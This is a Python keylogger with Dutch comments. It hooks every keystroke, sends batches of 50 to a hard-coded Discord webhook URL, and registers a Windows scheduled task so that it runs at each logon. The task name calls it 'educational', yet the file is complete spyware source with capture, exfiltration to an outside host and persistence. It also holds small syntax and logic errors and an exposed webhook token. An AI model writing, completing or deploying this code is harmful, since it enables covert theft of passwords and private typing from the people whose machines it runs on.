import subprocess
import keyboard
import requests
import os
import threading
import time
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1336013596626387026/SqvcYvu7p5Bm71aNqkisUzcem8aiFTOAIyZATH5UXf6tXXwc2IB-QBASu8yHzSy06a83"

keystrokes_buffer = []
buffer_lock = threading.Lock()

def send_to_discord_webhook(keystrokes):
    """
    Stuurt een blok met toetsaanslagen naar de Discord webhook.
    """
    payload = {"content": keystrokes}
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        response.raise_for_status()
        logging.info("Toetsaanslagen succesvol naar Discord verzonden.")
    except requests.RequestException as e:
        logging.error(f"Fout bij verzenden naar Discord: {e}")

def on_key_event(event):
    """
    Callback-functie die wordt aangeroepen bij elk toetsenbord-event.
    Alleen KEY_DOWN events worden verwerkt.
    """
    if event.event_type == keyboard.KEY_DOWN:
        with buffer_lock:
            keystrokes_buffer.append(event.name)

def process_keystrokes():
    """
    Controleert periodiek of er voldoende toetsaanslagen zijn verzameld.
    Als er 50 of meer items in de buffer staan, wordt een blok verzonden.
    """
    while True:
        time.sleep(1)  # Controleer elk seconde
        with buffer_lock:
            if len(keystrokes_buffer) >= 50:
                keystrokes = "".join(keystrokes_buffer[:50]
                del keystrokes_buffer[:50]
        if keystrokes:
            send_to_discord_webhook(keystrokes)

def create_scheduled_task():
    """
    Maakt een geplande taak aan zodat dit script bij het inloggen automatisch wordt uitgevoerd.
    Let op: hiervoor zijn mogelijk administratorrechten nodig.
    """
    username = os.getlogin()
    script_path = os.path.abspath(__file__)
    task_name = "Keylogger_Educational"

    powershell_command = (
        f"$action = New-ScheduledTaskAction -Execute 'python' -Argument '{script_path}';"
        f"$trigger = New-ScheduledTaskTrigger -AtLogon;"
        f"Register-ScheduledTask -Action $action -Trigger $trigger -TaskName '{task_name}' -User '{username}' -Force"
    )
    
    try:
        subprocess.run(["powershell.exe", "-Command", powershell_command], shell=True, check=True)
        logging.info("Geplande taak succesvol aangemaakt voor persistente uitvoering.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Fout bij het aanmaken van de geplande taak: {e}")

def main():

    create_scheduled_task()

    processing_thread = threading.Thread(target=process_keystrokes, daemon=True)
    processing_thread.start()

    keyboard.hook(on_key_event)
    logging.info("Keylogger gestart. Druk op ESC om te stoppen.")

    keyboard.wait("esc")
    logging.info("Keylogger gestopt.")

if __name__ == "__main__":
    main()
